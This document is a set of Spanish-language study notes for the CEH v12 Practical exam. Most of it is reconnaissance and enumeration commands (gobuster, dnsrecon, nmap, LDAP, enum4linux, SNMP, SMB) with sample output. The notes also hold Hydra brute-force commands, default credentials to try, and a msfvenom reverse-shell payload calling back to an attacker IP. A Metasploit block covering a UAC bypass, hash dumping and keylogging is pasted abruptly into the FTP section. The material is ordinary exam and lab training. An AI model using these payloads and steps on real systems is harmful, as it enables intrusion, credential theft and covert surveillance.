# CEH v12 Practical - Guía Completa de Herramientas y Comandos

> **Entorno del Examen CEH v12 Practical:**
> - **Parrot OS**: Herramientas de pentesting y línea de comandos
> - **Windows 7**: Herramientas gráficas, análisis de malware y criptografía
> - **6 horas** para completar 20 desafíos (mínimo 14 correctos para aprobar)
> - Examen de "libro abierto" con acceso a internet desde el host

---
### FUZZING WEB
# 🌐 Apuntes: Fuzzing Web con Gobuster

## 📂 Directory Fuzzing (Enumeración de directorios)

gobuster dir -u https://ejemplo.com/
-w /usr/share/Seclist/Discovery/Web-Content/directory-list-2.3-medium.txt
-t 200 --add-slash

text

### Parámetros explicados:
- `dir`: Modo de enumeración de directorios
- `-u`: URL objetivo
- `-w`: Wordlist a usar (diccionario de directorios)
- `-t 200`: Número de threads (hilos) para acelerar el proceso
- `--add-slash`: Añade "/" al final de cada directorio encontrado

---

## 🌍 Virtual Host Fuzzing (Enumeración de subdominios)

gobuster vhost -u https://dominio.com
-w /usr/share/Seclist/Discovery/DNS/subdomains-topmillion-110000.txt
-t 200

text

### Parámetros explicados:
- `vhost`: Modo de enumeración de virtual hosts
- `-u`: URL del dominio principal
- `-w`: Wordlist de subdominios
- `-t 200`: Hilos concurrentes para búsqueda rápida

---

## ⚙️ Otros modos útiles de Gobuster

### Fuzz Mode (Fuzzing de parámetros)
gobuster fuzz -u http://xxx.xxx/file/system.php?FUZZ=id
-w /usr/share/Seclist/Discovery/WebContent/directory-list-2.3-medium.txt
-b 404,400 --exclude-length 0

text
- Busca parámetros válidos en URLs
- `-b 404,400`: Excluye códigos de estado específicos
- `--exclude-length 0`: Excluye respuestas de longitud 0

---

## 💡 Tips para uso efectivo

### Filtros comunes:
- `-s 200`: Solo mostrar códigos 200 (éxito)
- `-b 404,403`: Excluir códigos 404 y 403
- `-x php,html,txt`: Buscar extensiones específicas

### Wordlists recomendadas:
- **Directorios**: `directory-list-2.3-medium.txt`
- **Subdominios**: `subdomains-topmillion-110000.txt`
- **Archivos**: `common.txt`, `big.txt`

### Ejemplo con extensiones:
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt -t 100
# 🌐 Apuntes: Sublist3r - Enumeración de Subdominios

## 📝 ¿Qué es Sublist3r?
- Herramienta Python para enumerar subdominios usando OSINT.
- Utiliza múltiples motores de búsqueda: Google, Yahoo, Bing, Baidu, Ask.
- También consulta: Netcraft, VirusTotal, ThreatCrowd, DNSdumpster, ReverseDNS.
- Integra **subbrute** para fuerza bruta con wordlists mejoradas.

---

## ⚙️ Instalación
git clone https://github.com/aboul3la/Sublist3r.git
cd Sublist3r
sudo pip install -r requirements.txt

text

### Dependencias necesarias:
- `requests`
- `dnspython` 
- `argparse`

---

## 🚀 Uso básico

### Enumeración simple:
python sublist3r.py -d ejemplo.com

text

### Con modo verbose (tiempo real):
python sublist3r.py -v -d ejemplo.com

text

### Con fuerza bruta habilitada:
python sublist3r.py -b -d ejemplo.com

text

### Escanear puertos específicos:
python sublist3r.py -d ejemplo.com -p 80,443

text

### Motores específicos:
python sublist3r.py -e google,yahoo,virustotal -d ejemplo.com

text

### Guardar resultados:
python sublist3r.py -d ejemplo.com -o subdominios.txt

text

---

## 🔧 Parámetros principales

| Parámetro | Descripción |
|-----------|-------------|
| `-d` | Dominio objetivo |
| `-b` | Habilitar módulo de fuerza bruta |
| `-p` | Escanear puertos TCP específicos |
| `-v` | Modo verbose (resultados en tiempo real) |
| `-t` | Número de threads para fuerza bruta |
| `-e` | Motores específicos (separados por comas) |
| `-o` | Guardar resultados en archivo |

---

## 💡 Tips para CEH

### Complementar con otras herramientas:
Después de Sublist3r, usar gobuster para directorios
gobuster dir -u http://subdominio.encontrado.com -w wordlist.txt

O usar con nmap para escanear servicios
nmap -sV -p- subdominios_encontrados.txt

text

### Usar en scripts Python:
import sublist3r
subdomains = sublist3r.main('ejemplo.com', 40, 'resultados.txt',
ports=None, silent=False, verbose=False,
enable_bruteforce=True, engines=None)

text

---

## 🎯 Casos de uso en examen CEH
- **Reconocimiento pasivo**: Encontrar superficie de ataque de un dominio
- **Descubrimiento de assets**: Identificar subdominios no documentados
- **Preparación para pentesting**: Mapear la infraestructura objetivo
- **Combinación con otras herramientas**: Entrada para Gobuster, Nmap, etc.

---

> **Nota**: Sublist3r es ideal para la fase de reconocimiento inicial. Combínalo con herram
## 🔍 FOOTPRINTING & RECONNAISSANCE

## GOOGLE DORK

https://dorksearch.com/

### Análisis de Certificados SSL/TLS
**Objetivo:** Descubrir subdominios y CN/SAN alternativos para ampliar la superficie de ataque.

**Entorno:** Cualquier navegador web

**Herramientas Online:**
- `ui.ctsearch.entrust.com` - Búsqueda de transparencia de certificados Entrust
- `search.censys.io` - Motor de búsqueda de dispositivos expuestos
- `crt.sh` - Base de datos de certificados públicos

**Interpretación de Resultados:**
- **CN (Common Name):** Dominio principal del certificado
- **SAN (Subject Alternative Name):** Dominios adicionales cubiertos
- **Issuer:** Autoridad certificadora que emitió el certificado
- **Validity:** Fechas de emisión y expiración

---

### DNS Reconnaissance
**Objetivo:** Enumerar registros DNS y obtener mapeo completo de la infraestructura del dominio. Emcontrando incluso subdominios, servidores de correos y otros...

**Entorno:** Parrot OS

#### DNSRECON
```bash
dnsrecon -d domain.com -t axfr
```
**Interpretación:**
- `-t axfr`: Intenta transferencia de zona completa
- **Salida exitosa:** Lista completa de registros DNS (A, MX, NS, CNAME)
- **Fallo:** "Zone transfer failed" - restricciones del servidor

  # Herramienta ESPECIALIZADA: DNSRecon para Obtener TODOS los Registros DNS

## ¿Por qué DNSRecon es LA herramienta especializada?

**DNSRecon** es la herramienta **más completa** para reconocimiento DNS porque:
- **Automatiza TODOS los tipos de consulta** DNS
- **Output estructurado** y fácil de leer
- **Múltiples técnicas** en un solo comando
- **Detección inteligente** de vulnerabilidades
- **Exportación de resultados** en múltiples formatos

---

## Comando MAESTRO de DNSRecon

### **Obtener TODOS los registros DNS:**
```bash
dnsrecon -d dominio.com -a
```

### **Comando COMPLETO especializado:**
```bash
dnsrecon -d dominio.com -t std,rvl,brt,srv,axfr -D /usr/share/wordlists/dnsrecon.txt --xml output.xml
```

**Explicación de parámetros:**
- `-d dominio.com`: Dominio objetivo
- `-t std`: Registros estándar (A, AAAA, CNAME, MX, NS, SOA, TXT)
- `-t rvl`: Reverse lookup (PTR)
- `-t brt`: Brute force subdominios
- `-t srv`: Registros SRV (_service._protocol)
- `-t axfr`: Zone transfer
- `-D wordlist`: Diccionario para brute force
- `--xml`: Exportar resultados

---

## Ejemplos Prácticos de Output

### **Comando básico:**
```bash
dnsrecon -d zonetransfer.me -a
```

**Output esperado:**
```
[*] Performing General Enumeration of Domain: zonetransfer.me
[*] DNSSEC is configured for zonetransfer.me
[*] DNSKEYs:
[*]     Name: zonetransfer.me                   Type: A       Target: 5.196.105.14
[*]     Name: zonetransfer.me                   Type: NS      Target: nsztm1.digi.ninja
[*]     Name: zonetransfer.me                   Type: NS      Target: nsztm2.digi.ninja
[*]     Name: zonetransfer.me                   Type: MX      Target: ASPMX.L.GOOGLE.COM
[*]     Name: zonetransfer.me                   Type: MX      Target: ALT1.ASPMX.L.GOOGLE.COM
[*]     Name: zonetransfer.me                   Type: SOA     Target: nsztm1.digi.ninja
[*]     Name: zonetransfer.me                   Type: TXT     Target: "google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"

[*] Performing Zone Transfer against all Name Servers
[*] Testing NS server nsztm1.digi.ninja
[*] Zone Transfer was successful!!
[*]     Name: zonetransfer.me                   Type: A       Target: 5.196.105.14
[*]     Name: asfdbbox.zonetransfer.me          Type: A       Target: 127.0.0.1
[*]     Name: canberra-office.zonetransfer.me   Type: A       Target: 202.14.81.230
[*]     Name: dc-office.zonetransfer.me         Type: A       Target: 143.228.181.132
[*]     Name: deadbeef.zonetransfer.me          Type: AAAA    Target: dead:beaf::
[*]     Name: email.zonetransfer.me             Type: A       Target: 74.125.206.26
[*]     Name: home.zonetransfer.me              Type: A       Target: 127.0.0.1
[*]     Name: office.zonetransfer.me            Type: A       Target: 4.23.39.254
[*]     Name: ipv6actnow.org.zonetransfer.me    Type: AAAA    Target: 2001:67c:2e8:11::c100:1332
[*]     Name: owa.zonetransfer.me               Type: A       Target: 207.46.197.32
[*]     Name: robinwood.zonetransfer.me         Type: TXT     Target: "Robin Wood"
[*]     Name: rp.zonetransfer.me                Type: RP      Target: robin.zonetransfer.me. robinwood.zonetransfer.me.
[*]     Name: sip.zonetransfer.me               Type: A       Target: 217.147.177.157
[*]     Name: sqli.zonetransfer.me              Type: A       Target: 127.0.0.1
[*]     Name: sshd.zonetransfer.me              Type: A       Target: 127.0.0.1
[*]     Name: staging.zonetransfer.me           Type: CNAME   Target: www.sydneyoperahouse.com.
[*]     Name: alltcpportsopen.firewall.test.zonetransfer.me Type: A Target: 127.0.0.1
[*]     Name: testing.zonetransfer.me           Type: CNAME   Target: www.zonetransfer.me.
[*]     Name: vpn.zonetransfer.me               Type: A       Target: 174.36.59.154
[*]     Name: www.zonetransfer.me               Type: A       Target: 5.196.105.14
[*]     Name: xss.zonetransfer.me               Type: A       Target: 127.0.0.1

[*] SRV Record Enumeration
[*]     Name: _sip._tcp.zonetransfer.me         Type: SRV     Target: sip.zonetransfer.me Port: 5060

[*] Completed enumeration of zonetransfer.me
[*] 36 Records Found
```

---

## Comandos Especializados por Tipo de Registro

### **1. Registros Estándar (A, AAAA, MX, NS, SOA, TXT):**
```bash
dnsrecon -d dominio.com -t std
```

### **2. Solo Zone Transfer:**
```bash
dnsrecon -d dominio.com -t axfr
```

### **3. Brute Force con diccionario completo:**
```bash
dnsrecon -d dominio.com -t brt -D /usr/share/wordlists/dnsrecon.txt
```

### **4. Registros SRV (servicios específicos):**
```bash
dnsrecon -d dominio.com -t srv
```

### **5. Reverse DNS completo de rango:**
```bash
dnsrecon -r 192.168.1.0/24
```

---

## Comando DEFINITIVO para el Examen CEH v12

### **El comando que SIEMPRE usar:**
```bash
dnsrecon -d [DOMINIO] -t std,rvl,brt,srv,axfr -D /usr/share/wordlists/dnsrecon.txt --xml dnsrecon_results.xml -c dnsrecon_results.csv
```

**¿Qué hace este comando?**
1. **std**: Obtiene A, AAAA, CNAME, MX, NS, SOA, TXT
2. **rvl**: Reverse lookup de todas las IPs encontradas
3. **brt**: Brute force subdominios con diccionario
4. **srv**: Busca servicios SRV (_http, _ftp, _ldap, etc.)
5. **axfr**: Intenta zone transfer en todos los NS encontrados
6. **--xml**: Exporta a XML para análisis posterior
7. **-c**: Exporta a CSV para spreadsheet

---

## Wordlists Especializadas para DNSRecon

### **Ubicaciones de diccionarios:**
```bash
# Diccionario por defecto de DNSRecon
/usr/share/wordlists/dnsrecon.txt

# Diccionarios alternativos
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

# Crear diccionario personalizado
echo -e "admin\napi\ndev\ntest\nstaging\nmail\nftp\nvpn\ndb\nbackup" > custom_subdomains.txt
```

### **Usar diccionario personalizado:**
```bash
dnsrecon -d dominio.com -t brt -D custom_subdomains.txt
```

---

## Análisis de Resultados

### **Interpretar el output de DNSRecon:**

**Indicadores CRÍTICOS a buscar:**
```
[*] Zone Transfer was successful!!          ← VULNERABILIDAD CRÍTICA
[*] 36 Records Found                        ← Alto número = buena enumeración
Type: A       Target: 127.0.0.1            ← Servicios internos expuestos
Type: A       Target: 192.168.x.x          ← IPs privadas reveladas
Type: CNAME   Target: admin.interno.com    ← Servicios administrativos
Type: SRV     Target: _ldap._tcp           ← Servicios de directorio
Type: TXT     Target: "v=spf1 include:"    ← Información SPF/DKIM
```

**Subdominios de ALTO VALOR:**
- `admin.*`, `panel.*` → Interfaces administrativas
- `api.*`, `dev.*` → APIs y entornos desarrollo
- `mail.*`, `smtp.*` → Servidores de correo
- `vpn.*`, `remote.*` → Accesos remotos
- `db.*`, `database.*` → Bases de datos
- `backup.*`, `ftp.*` → Servicios de archivos

---

## Comparación con Otras Herramientas

### **DNSRecon vs Competencia:**

| Herramienta | Registros Std | Zone Transfer | Brute Force | SRV Records | Reverse DNS | Export |
|-------------|---------------|---------------|-------------|-------------|-------------|---------|
| **DNSRecon** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| host | ✅ | ✅ | ❌ | ❌ | ✅ | ❌ |
| dig | ✅ | ✅ | ❌ | ✅ | ✅ | ❌ |
| nslookup | ✅ | ✅ | ❌ | ❌ | ✅ | ❌ |
| fierce | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ |

**Conclusión: DNSRecon es la ÚNICA herramienta que hace TODO automáticamente.**

---

## Tips para el Examen CEH v12

### **Estrategia recomendada:**
1. **Usar DNSRecon primero** con comando completo
2. **Analizar resultados** buscando zone transfer exitoso
3. **Documentar todos los subdominios** encontrados
4. **Priorizar subdominios críticos** (admin, api, dev)
5. **Exportar resultados** para referencia posterior

### **Comando de respaldo si DNSRecon falla:**
```bash
# Si DNSRecon no está disponible, usar combinación:
host -t ns dominio.com
host -l dominio.com ns1.dominio.com
fierce -dns dominio.com
```
#### DNSENUM  
```bash
dnsenum domain.com
```
**Interpretación:**
- Enumera servidores de nombres, registros MX y subdominios
- **Host addresses found:** IPs descubiertas
- **Name Servers:** Servidores DNS autoritativos

#### FIERCE
```bash
fierce --domain domain.com
```
**Interpretación:**
- **Found:** Subdominios activos detectados
- **Nearby:** IPs adyacentes que podrían pertenecer al objetivo

#### Herramientas Básicas DNS
```bash
# Obtener servidores NS
host -t ns domain.com

# Zone transfer manual
dig axfr domain.com @nameserver

# Verificar registro específico
dig ns zonetransfer.me
nslookup
> set type=ns
> domain.com
```

---
# Apuntes CEH v12: Reconocimiento DNS

## Tipos de Registros DNS Comunes

### Common DNS Record Types

| Record | Description |
|--------|-------------|
| **A** | Address record (IPv4) |
| **AAAA** | Address record (IPv6) |
| **CNAME** | Canonical Name record |
| **MX** | Mail Exchanger record |
| **NS** | Nameserver record |
| **PTR** | Pointer record |
| **SOA** | Start of Authority record |
| **SRV** | Service Location record |
| **TXT** | Text record |

### Zone Transfer (AXFR)
**AXFR**: Zone transfer. Includes all records about a domain

---

## Comandos de Enumeración DNS

### Consultas DNS Básicas

**Consultar registro A:**
```bash
nslookup domain.com
dig domain.com A
```
_Ejemplo output:_
```
domain.com.    300    IN    A    192.168.1.10
```

**Consultar registro MX:**
```bash
dig domain.com MX
nslookup -type=MX domain.com
```
_Ejemplo output:_
```
domain.com.    300    IN    MX    10 mail.domain.com.
```

**Consultar registro NS:**
```bash
dig domain.com NS
nslookup -type=NS domain.com
```
_Ejemplo output:_
```
domain.com.    300    IN    NS    ns1.domain.com.
domain.com.    300    IN    NS    ns2.domain.com.
```

**Consultar registro TXT:**
```bash
dig domain.com TXT
nslookup -type=TXT domain.com
```
_Ejemplo output:_
```
domain.com.    300    IN    TXT    "v=spf1 include:_spf.google.com ~all"
```

**Consultar registro SOA:**
```bash
dig domain.com SOA
nslookup -type=SOA domain.com
```
_Ejemplo output:_
```
domain.com.    300    IN    SOA    ns1.domain.com. admin.domain.com.
```

---

## Zone Transfer (AXFR)

### Intentar Zone Transfer
```bash
dig axfr domain.com @ns1.domain.com
nslookup
> server ns1.domain.com
> set type=axfr
> domain.com
```
_Ejemplo output exitoso:_
```
domain.com.            SOA    ns1.domain.com. admin.domain.com.
www.domain.com.        A      192.168.1.10
mail.domain.com.       A      192.168.1.11  
ftp.domain.com.        A      192.168.1.12
```

### Automatizar Zone Transfer con dnsrecon
```bash
dnsrecon -d domain.com -t axfr
```
_Ejemplo output:_
```
[*] Checking for Zone Transfer for domain.com name servers
[*] Zone Transfer was successful!!
[*] NS ns1.domain.com 192.168.1.5
[*] A www.domain.com 192.168.1.10
```

---

## Enumeración Avanzada DNS

### Usar DNSenum
```bash
dnsenum domain.com
```
_Ejemplo output:_
```
Host's addresses:
domain.com.                      300      IN    A        192.168.1.10

Name Servers:
ns1.domain.com.                  300      IN    A        192.168.1.5
```

### Usar Fierce para encontrar subdominios
```bash
fierce -dns domain.com
```
_Ejemplo output:_
```
DNS Servers for domain.com:
        ns1.domain.com
        ns2.domain.com

Trying zone transfer first...
        Zone transfer failed.

Now performing dictionary-based testing...
        www.domain.com: 192.168.1.10
        mail.domain.com: 192.168.1.11
```

### Reverse DNS Lookup
```bash
dig -x 192.168.1.10
nslookup 192.168.1.10
```
_Ejemplo output:_
```
10.1.168.192.in-addr.arpa. 300 IN PTR www.domain.com.
```

---

## Herramientas Adicionales

### DNSmap - Escaneo de subdominios
```bash
dnsmap domain.com
```

### TheHarvester - Recopilación de información
```bash
theHarvester -d domain.com -b google
```

### Amass - Enumeración de subdominios
```bash
amass enum -d domain.com
```

---

## Notas Importantes

### Consideraciones de Enumeración DNS:
- **Zone Transfer** es la técnica más efectiva si está mal configurada
- Los registros **MX** revelan servidores de correo
- Los registros **NS** muestran servidores DNS autoritarios
- Los registros **TXT** pueden contener información sensible (SPF, DKIM)

### Tips Prácticos:
- Siempre intentar zone transfer en todos los nameservers encontrados
- Usar múltiples herramientas para enumeración completa
- Los subdominios pueden revelar servicios internos
- Documentar todos los subdominios y IPs encontradas

---

> Última actualización: 16 sept 2025

## 🖥️ NETWORK SCANNING & ENUMERATION

### NMAP - Master Tool
**Objetivo:** Descubrir hosts vivos, puertos abiertos, servicios y SO.

**Entorno:** Parrot OS (CLI) y Windows 7 (Zenmap GUI)

#### Comandos Fundamentales
```bash
# Host Discovery
nmap -sn 192.168.1.0/24
nmap -sP 192.168.1.0/24

# Escaneo rápido de puertos comunes
nmap -F target_ip

# Escaneo completo con detección de SO y servicios
nmap -A -T4 target_ip

# Escaneo sigiloso SYN
nmap -sS target_ip

# Escaneo UDP (más lento)
nmap -sU --top-ports 1000 target_ip

# Escaneo completo de puertos
nmap -p- target_ip
```

#### Interpretación de Salidas NMAP
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4
80/tcp   open  http       Apache 2.4.6
443/tcp  open  https      Apache 2.4.6
3306/tcp open  mysql      MySQL 5.7.42
```

**Estados de Puerto:**
- **open:** Servicio activo escuchando
- **closed:** Puerto cerrado pero accesible
- **filtered:** Bloqueado por firewall
- **unfiltered:** Accesible pero estado desconocido

#### Scripts NSE Importantes
```bash
# Vulnerabilidades generales
nmap --script vuln target_ip

# SMB enumeration
nmap --script smb-enum-shares target_ip
nmap --script smb-os-discovery target_ip

# Detección de servicios web
nmap --script http-enum target_ip

# Fuerza bruta básica
nmap --script brute target_ip
```

### NETDISCOVER
**Objetivo:** Descubrir hosts vivos en la red local usando ARP.

**Entorno:** Parrot OS

```bash
# Escaneo pasivo (escucha tráfico ARP)
netdiscover -i eth0

# Escaneo activo de rango específico
netdiscover -r 192.168.1.0/24 -i eth0
```

**Interpretación:**
```
IP Address       MAC Address       Count     Len  MAC Vendor / Hostname
192.168.1.1      00:11:22:33:44:55  1        60   Cisco Systems
192.168.1.10     aa:bb:cc:dd:ee:ff  1        60   Dell Inc.
```

---
## LDAP Enumeration

¿Cuándo usar cada comando LDAP?
🔍 1. Descubrir hosts con LDAP (puerto 389)
Usa este comando al inicio de la fase de reconocimiento para encontrar qué máquinas ofrecen servicios LDAP en la red.

bash
nmap -p 389 --open -sV 192.168.1.0/24
📖 2. Consultar Root DSE (Directorio raíz)
Empléalo inmediatamente después de localizar un host LDAP para extraer información básica del dominio sin necesidad de autenticación. Te muestra los naming contexts.

bash
ldapsearch -x -h <IP_DC> -s base -b "" \
  namingContexts defaultNamingContext rootDomainNamingContext
🗂️ 3. Obtener contexto de dominio y esquema
Úsalo para mapear la estructura de Active Directory:

defaultNamingContext te da el DN del dominio

schemaNamingContext te da el DN del esquema

bash
ldapsearch -x -h <IP_DC> \
  -b "" defaultNamingContext schemaNamingContext
👤 4. Enumerar usuarios del dominio
Aplica este comando cuando necesites listar todas las cuentas de usuario del dominio, útil en la fase de enumeración para identificar objetivos.

bash
ldapsearch -x -h <IP_DC> \
  -b "DC=domain,DC=com" "(objectClass=user)" \
  sAMAccountName displayName
👥 5. Enumerar grupos del dominio
Empléalo para descubrir los grupos existentes y sus miembros, clave para planificar movimientos laterales y privilegios.

bash
ldapsearch -x -h <IP_DC> \
  -b "DC=domain,DC=com" "(objectClass=group)" \
  cn member
🖥️ 6. Enumerar controladores de dominio (sitios AD)
Úsalo para identificar en qué sitios de Active Directory están registrados los DCs, esencial en entornos distribuidos.

bash
ldapsearch -x -h <IP_DC> \
  -b "CN=Sites,CN=Configuration,DC=domain,DC=com" objectClass=site
⚙️ 7. Extraer versión del controlador de dominio
Ejecuta este comando para determinar el nivel funcional y la versión del DC, necesario para elegir exploits específicos.

bash
ldapsearch -x -h <IP_DC> \
  -b "" supportedLDAPVersion msDS-Behavior-Version
📂 8. Dump completo de un contenedor (Users)
Recurre a este comando cuando tengas credenciales de usuario válidas y necesites un volcado completo de objetos (por ejemplo, cuentas de usuario).

bash
ldapsearch -x -h <IP_DC> \
  -D "domain\\user" -W \
  -b "CN=Users,DC=domain,DC=com" "(objectClass=*)"
Tip: Reemplaza <IP_DC> y domain,DC=com con los valores reales de tu entorno antes de ejecutar.
## 📁 SMB/NETBIOS ENUMERATION

### Puertos Objetivo
- **UDP 137:** NetBIOS Name Service
- **UDP 138:** NetBIOS Datagram Service  
- **TCP 139:** NetBIOS Session Service
- **TCP 445:** Microsoft-DS (SMB over TCP)

### Herramientas de Enumeración

#### ENUM4LINUX
**Objetivo:** Enumeración completa de sistemas Windows/Samba.

**Entorno:** Parrot OS

```bash
enum4linux -a target_ip
```

**Interpretación de Salida:**
```
[+] Enumerating users using SID S-1-5-21-xxx-xxx-xxx
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[administrator] rid:[0x1f4]

[+] Share Enumeration on target_ip
\\target_ip\ADMIN$    [E] Default share
\\target_ip\C$        [E] Default share  
\\target_ip\IPC$      IPC    IPC Service
```
# 🔍 Apuntes: Enumeración con Enum4linux

## 📋 Comandos Básicos de Enum4linux

### **1. Enumerar Lista de Usuarios (-U)**
enum4linux -u john -p password123 -U 192.168.1.100

text
**¿Qué obtienes?**
- Lista completa de usuarios del sistema
- SIDs (Security Identifiers) asociados
- Información de cuentas activas/inactivas

**Ejemplo de salida:**
[+] Getting local users:
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[john] rid:[0x3e8]
user:[alice] rid:[0x3e9]

text

---

### **2. Detalles del Sistema Operativo (-o)**
enum4linux -u john -p password123 -o 192.168.1.100

text
**¿Qué obtienes?**
- Versión exacta del OS (Windows Server 2019, Ubuntu 20.04, etc.)
- Service Pack instalados
- Arquitectura (32/64 bits)
- Domain/Workgroup información

**Ejemplo de salida:**
[+] OS information on 192.168.1.100:
[+] OS: Windows Server 2019 Standard 17763
[+] Domain: CORPORATE
[+] Server Type: Windows NT Server

text

---

### **3. Política de Contraseñas (-P)**
enum4linux -u john -p password123 -P 192.168.1.100

text
**¿Qué obtienes?**
- Longitud mínima de contraseña
- Complejidad requerida
- Tiempo de expiración
- Intentos de login permitidos
- Duración de bloqueo

**Ejemplo de salida:**
[+] Password Policy:
[+] Minimum password length: 8
[+] Password history length: 12
[+] Maximum password age: 90 days
[+] Password must meet complexity requirements
[+] Lockout threshold: 5 attempts

text

---

### **4. Información de Grupos (-G)**
enum4linux -u john -p password123 -G 192.168.1.100

text
**¿Qué obtienes?**
- Grupos locales y de dominio
- Membresía de usuarios
- Privilegios de grupos
- Grupos administrativos

**Ejemplo de salida:**
[+] Groups on 192.168.1.100:
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Domain Admins] rid:[0x200]
group:[IT Support] rid:[0x3ea]

text

---

### **5. Recursos Compartidos (-S)**
enum4linux -u john -p password123 -S 192.168.1.100

text
**¿Qué obtienes?**
- Carpetas compartidas disponibles
- Permisos de acceso (Read/Write)
- Recursos administrativos ocultos (C$, ADMIN$)
- Información de impresoras compartidas

**Ejemplo de salida:**
[+] Share Enumeration on 192.168.1.100:
[+] Sharename: ADMIN$ Type: Disk
[+] Sharename: C$ Type: Disk
[+] Sharename: Documents Type: Disk
[+] Sharename: Printer1 Type: Printer

text

---

## 🔧 Comandos Combinados y Adicionales

### **Enumeración completa en un solo comando:**
enum4linux -u john -p password123 -a 192.168.1.100

text
*(-a = all, incluye todas las opciones anteriores)*

### **Sin credenciales (null session):**
enum4linux -a 192.168.1.100

text

### **Con archivo de credenciales:**
enum4linux -u john -p password123 -k users.txt 192.168.1.100

text

---

## 💡 Tips para Examen CEH

### **Flujo de trabajo recomendado:**
1. **Primero**: Intentar sin credenciales `enum4linux -a IP`
2. **Si falla**: Usar credenciales válidas encontradas previamente
3. **Enfocarse en**: `-U` (usuarios) y `-S` (shares) para acceso inicial
4. **Después**: `-P` (password policy) para planificar ataques
5. **Finalmente**: `-G` (grupos) para escalación de privilegios

### **Credenciales comunes para probar:**
- `guest:` (sin password)
- `admin:admin`
- `administrator:password`
- `test:test`

### **Información crítica a buscar:**
- **Usuarios**: Cuentas de servicio, administradores
- **Shares**: Carpetas con permisos de escritura
- **Password Policy**: Para ataques de fuerza bruta
- **Grupos**: Identificar grupos privilegiados

---

## 🚨 Casos de Uso Específicos

### **Para Active Directory:**
enum4linux -u domain\john -p password123 -a DC_IP

text

### **Para servidores Samba/Linux:**
enum4linux -u smbuser -p smbpass -a LINUX_IP

text

### **Para enumerar RIDs (fuerza bruta de usuarios):**
enum4linux -u john -p password123 -r 192.168.1.100
#### SMBCLIENT
```bash
# Listar shares sin autenticación
smbclient -L //target_ip -N

# Conectar a share específico
smbclient //target_ip/sharename

# Con credenciales
smbclient //target_ip/share -U username%password
```

**Comandos dentro de SMB:**
```
smb: \> dir          # Listar archivos
smb: \> get file.txt # Descargar archivo
smb: \> put file.txt # Subir archivo
smb: \> cd folder    # Cambiar directorio
```

#### NXC (NetExec)
```bash
nxc smb target_ip
nxc smb target_ip -u usuario -p password
```

---
# Apuntes CEH v12: Enumeración de Servicios y Ejemplos de Output

## SNMP (Puertos 161-162/UDP)

**Escaneo de toda la red SNMP:**
```bash
nmap -sU 192.168.1.0/24
```
_Ejemplo output:_
```
PORT    STATE SERVICE
161/udp open  snmp
162/udp open  snmptrap
```

**Enumeración con snmp-check:**
```bash
snmp-check 192.168.1.5
```
_Ejemplo output:_
```
System Name: ubuntu1
Contact: admin@domain.local
...otros datos SNMP
```

**Enumerar procesos SNMP (nmap):**
```bash
nmap -sU -p 161 --script=snmp-processes 192.168.1.5
```
_Ejemplo output:_
```
161/udp open snmp
| snmp-processes:
|   1. init
|   2. sshd
|   3. snmpd
```

**Enumerar interfaces SNMP:**
```bash
nmap -sU -p161 --script=snmp-interfaces 192.168.1.5
```
_Ejemplo output:_
```
161/udp open snmp
| snmp-interfaces:
|   eth0: up
|   eth1: down
```

**Validar strings SNMP en Metasploit:**
```bash
use auxiliary/scanner/snmp/snmplogin
set RHOSTS 192.168.1.5
set RPORT 161
run
```
_Ejemplo output:_
```
[+] Valid SNMP login found: public
```

---

## FTP (Puerto 21)

**Descubrir FTP abiertos en toda la red:**
```bash
nmap -p 21 192.168.1.0/24
```
_Ejemplo output:_
```
PORT   STATE SERVICE
21/tcp open  ftp
```

**Bruteforce FTP con Hydra:**
```bash
hydra -l user -P wordlist.txt ftp://192.168.1.10
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P password_list.txt 192.168.1.10 ftp
```
_Ejemplo output:_
```
[21][ftp] host: 192.168.1.10 login: admin password: p@ssw0rd
```
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86
-f exe LHOST=10.10.10.11 LPORT=444 -o /root/Desktop/Test.exe

text

### **Configurar handler:**
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.11
set LPORT 444
run

text

### **Post-explotación VNC:**
En meterpreter:
sessions -i 1
sysinfo
run vnc

text

---

## ⬆️ 5. Escalación de Privilegios

### **Payload con encoding:**
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86
-e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Exploit.exe

text

### **Bypass UAC:**
En meterpreter:
getuid
run post/windows/gather/smart_hashdump # Fallará sin privilegios
getsystem -t 1 # Fallará también

background
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.11
set TARGET 0
exploit

Nueva sesión con privilegios elevados:
getuid
getsystem
run post/windows/gather/smart_hashdump # Ahora funcionará

text

---

## 🖥️ 6. Hacking Windows 10 - Post-Explotación

### **Comandos Meterpreter útiles:**
sysinfo
ipconfig
getuid
pwd
ls
timestomp secret.txt -v # Ver atributos MACE
cd C:
download bootmgr
search -f pagefile.sys
keyscan_start
keyscan_dump
idletime
shutdown
**Descargar archivo desde FTP:**
```bash
get archivo.txt
```
_Ejemplo output:_
```
200 PORT command successful
150 Opening ASCII mode data connection for archivo.txt
226 Transfer complete
```

---

## SMB (Puertos 445 y 139)

**Enumerar shares SMB:**
```bash
nmap -p445 --script=smb-enum-shares 192.168.1.11
```
_Ejemplo output:_
```
| smb-enum-shares:
|   ADMIN$: Remote Admin
|   C$: Default share
|   Public: Read/Write
```

**Enumerar usuarios SMB:**
```bash
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=contraseña 192.168.1.11
```
_Ejemplo output:_
```
| smb-enum-users:
|   Administrator
|   Guest
|   User1
```

**Enumerar grupos SMB:**
```bash
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=contraseña 192.168.1.11
```
_Ejemplo output:_
```
| smb-enum-groups:
|   Administrators
|   Users
